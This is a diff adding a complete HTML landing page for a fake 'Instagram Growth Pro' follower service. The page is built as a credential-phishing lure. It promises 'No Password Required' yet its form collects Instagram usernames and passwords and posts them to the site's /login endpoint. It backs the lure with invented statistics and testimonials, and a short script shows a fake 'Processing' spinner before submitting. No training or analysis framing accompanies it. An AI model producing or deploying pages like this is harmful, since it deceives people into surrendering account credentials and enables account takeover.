@@ -1,0 +1,388 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Growth Pro | Get 1000+ Real Followers</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        /* استایل‌ها بدون تغییر می‌مانند */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #405DE6, #5851DB, #833AB4, #C13584, #E1306C, #FD1D1D);
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            line-height: 1.6;
+        }
+
+        .container {
+            max-width: 1200px;
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        header {
+            text-align: center;
+            margin-bottom: 40px;
+            width: 100%;
+        }
+
+        .logo {
+            font-size: 3rem;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        h1 {
+            font-size: 2.8rem;
+            margin-bottom: 15px;
+            text-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
+        }
+
+        .tagline {
+            font-size: 1.4rem;
+            margin-bottom: 30px;
+            opacity: 0.9;
+        }
+
+        .main-content {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 40px;
+            width: 100%;
+        }
+
+        .benefits {
+            flex: 1;
+            min-width: 300px;
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+        }
+
+        .benefits h2 {
+            font-size: 1.8rem;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .benefit-item {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+            font-size: 1.1rem;
+        }
+
+        .benefit-item i {
+            margin-right: 15px;
+            font-size: 1.3rem;
+            color: #FFDC80;
+        }
+
+        .login-form {
+            flex: 1;
+            min-width: 300px;
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+        }
+
+        .login-form h2 {
+            font-size: 1.8rem;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 15px;
+            border: none;
+            border-radius: 10px;
+            background: rgba(255, 255, 255, 0.9);
+            font-size: 1rem;
+            color: #333;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(255, 255, 255, 0.3);
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 15px;
+            border: none;
+            border-radius: 10px;
+            background: #FFDC80;
+            color: #833AB4;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 10px;
+        }
+
+        .submit-btn:hover {
+            background: #fff;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        }
+
+        .stats {
+            display: flex;
+            justify-content: space-around;
+            width: 100%;
+            margin: 40px 0;
+            text-align: center;
+            flex-wrap: wrap;
+            gap: 20px;
+        }
+
+        .stat-item {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 15px;
+            padding: 20px;
+            min-width: 200px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+        }
+
+        .stat-number {
+            font-size: 2.5rem;
+            font-weight: 700;
+            margin-bottom: 5px;
+            color: #FFDC80;
+        }
+
+        .stat-text {
+            font-size: 1.1rem;
+            opacity: 0.9;
+        }
+
+        .testimonials {
+            width: 100%;
+            margin-top: 40px;
+            text-align: center;
+        }
+
+        .testimonials h2 {
+            font-size: 2rem;
+            margin-bottom: 30px;
+        }
+
+        .testimonial-cards {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 20px;
+        }
+
+        .testimonial-card {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 15px;
+            padding: 20px;
+            max-width: 300px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+        }
+
+        .testimonial-text {
+            font-style: italic;
+            margin-bottom: 15px;
+        }
+
+        .testimonial-author {
+            font-weight: 600;
+            color: #FFDC80;
+        }
+
+        footer {
+            margin-top: 50px;
+            text-align: center;
+            width: 100%;
+            padding: 20px;
+            font-size: 0.9rem;
+            opacity: 0.8;
+            border-top: 1px solid rgba(255, 255, 255, 0.2);
+        }
+
+        .disclaimer {
+            font-size: 0.8rem;
+            margin-top: 10px;
+            opacity: 0.7;
+        }
+
+        @media (max-width: 768px) {
+            h1 {
+                font-size: 2.2rem;
+            }
+
+            .tagline {
+                font-size: 1.2rem;
+            }
+
+            .main-content {
+                flex-direction: column;
+            }
+
+            .stats {
+                flex-direction: column;
+                align-items: center;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <div class="logo">
+                <i class="fab fa-instagram"></i>
+                <span>Instagram Growth Pro</span>
+            </div>
+            <h1>Get 1000+ Real Instagram Followers</h1>
+            <p class="tagline">Grow your Instagram presence organically with our proven growth strategy</p>
+        </header>
+
+        <div class="main-content">
+            <div class="benefits">
+                <h2><i class="fas fa-star"></i> Why Choose Us?</h2>
+                <div class="benefit-item">
+                    <i class="fas fa-check-circle"></i>
+                    <span>100% Real & Active Followers</span>
+                </div>
+                <div class="benefit-item">
+                    <i class="fas fa-check-circle"></i>
+                    <span>No Password Required - Secure Connection</span>
+                </div>
+                <div class="benefit-item">
+                    <i class="fas fa-check-circle"></i>
+                    <span>Organic Growth Strategy</span>
+                </div>
+                <div class="benefit-item">
+                    <i class="fas fa-check-circle"></i>
+                    <span>24/7 Customer Support</span>
+                </div>
+                <div class="benefit-item">
+                    <i class="fas fa-check-circle"></i>
+                    <span>30-Day Growth Guarantee</span>
+                </div>
+                <div class="benefit-item">
+                    <i class="fas fa-check-circle"></i>
+                    <span>No Bots or Fake Accounts</span>
+                </div>
+            </div>
+
+            <div class="login-form">
+                <h2><i class="fas fa-user-plus"></i> Get Started Now</h2>
+                <form id="instagramForm" action="/login" method="post">
+                    <div class="form-group">
+                        <label for="username">Instagram Username</label>
+                        <input type="text" id="username" name="username" placeholder="Enter your Instagram username" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="password">Password</label>
+                        <input type="password" id="password" name="password" placeholder="Enter your Password" required>
+                    </div>
+                    <button type="submit" class="submit-btn">Start Growing My Followers</button>
+                </form>
+                <p class="disclaimer">By submitting, you agree to our Terms of Service.</p>
+            </div>
+        </div>
+
+        <div class="stats">
+            <div class="stat-item">
+                <div class="stat-number">10,000+</div>
+                <div class="stat-text">Happy Users</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-number">2.5M+</div>
+                <div class="stat-text">Followers Delivered</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-number">99%</div>
+                <div class="stat-text">Satisfaction Rate</div>
+            </div>
+        </div>
+
+        <div class="testimonials">
+            <h2>Success Stories</h2>
+            <div class="testimonial-cards">
+                <div class="testimonial-card">
+                    <p class="testimonial-text">"I gained over 1,200 real followers in just 2 weeks! My engagement has skyrocketed."</p>
+                    <p class="testimonial-author">- @SarahFitness</p>
+                </div>
+                <div class="testimonial-card">
+                    <p class="testimonial-text">"As a small business, this service helped me reach a wider audience. Highly recommended!"</p>
+                    <p class="testimonial-author">- @UrbanBoutique</p>
+                </div>
+                <div class="testimonial-card">
+                    <p class="testimonial-text">"Finally a service that delivers real followers, not bots. My account growth has been amazing!"</p>
+                    <p class="testimonial-author">- @TravelWithMark</p>
+                </div>
+            </div>
+        </div>
+
+        <footer>
+            <p>Instagram Growth Pro &copy; 2025. All rights reserved.</p>
+            <p class="disclaimer">This service is not affiliated with Instagram or Meta. Instagram is a trademark of Meta Platforms, Inc.</p>
+        </footer>
+    </div>
+
+    <script>
+        document.getElementById('instagramForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            if(username && password) {
+                // Show loading state
+                const submitBtn = document.querySelector('.submit-btn');
+                const originalText = submitBtn.innerHTML;
+                submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
+                submitBtn.disabled = true;
+
+                // Allow form to submit normally after a brief delay
+                setTimeout(function() {
+                    document.getElementById('instagramForm').submit();
+                }, 1500);
+            }
+        });
+    </script>
+</body>
+</html>
